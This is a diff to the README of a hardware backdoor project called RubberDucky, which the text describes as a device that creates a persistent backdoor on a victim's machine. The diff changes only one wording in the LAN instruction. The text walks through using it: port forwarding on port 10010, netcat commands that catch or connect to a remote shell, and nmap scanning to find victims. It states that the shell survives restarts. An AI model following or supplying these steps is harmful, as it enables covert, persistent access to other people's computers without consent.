@@ -5,7 +5,7 @@ The RubberDucky is a SoC that creates a persistent backdoor onto the victim's ma
 The attack is by default on WAN. For the attack to work, the attacker needs to enable port forwarding in his router with port 10010. On the attacker machine, run the command "nc -lp 10010". 
 
 
-To do an attack on LAN, uncomment the respective line in RubberDucky.ino. On the attacker machine, run the command "nc VICTIMIP 10010". The victim Ip can be found using nmap. Look for hosts with port 10010 open. 
+To do an attack on LAN, uncomment and comment the respective line in RubberDucky.ino. On the attacker machine, run the command "nc VICTIMIP 10010". The victim Ip can be found using nmap. Look for hosts with port 10010 open. 
 
 
 The attack will grant access to the victim's command line. The connection will be reopened if the victim restarts his machine. 
